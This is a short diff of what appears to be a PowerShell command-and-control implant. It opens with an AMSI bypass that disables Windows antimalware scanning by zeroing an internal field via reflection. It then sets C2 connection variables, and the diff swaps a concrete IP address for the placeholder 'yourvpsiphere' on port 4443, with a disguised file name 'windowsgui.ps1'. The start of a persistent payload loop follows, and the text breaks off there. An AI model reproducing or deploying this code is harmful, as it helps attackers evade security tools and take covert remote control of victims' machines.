@@ -1,7 +1,7 @@
 #Requires -RunAsAdministrator
 [Ref].Assembly.GetTypes()|ForEach-Object{if($_.Name -like "*iUtils"){$_.GetFields('NonPublic,Static')|ForEach-Object{if($_.Name -like "*Context"){$_.SetValue($null,[IntPtr]::Zero)}}}}
 
-$C2_IP="152.53.38.5";$C2_PORT=4443;$F="windowsgui.ps1"
+$C2_IP="yourvpsiphere";$C2_PORT=4443;$F="windowsgui.ps1"
 
 $payload=@'
 while($true){try{
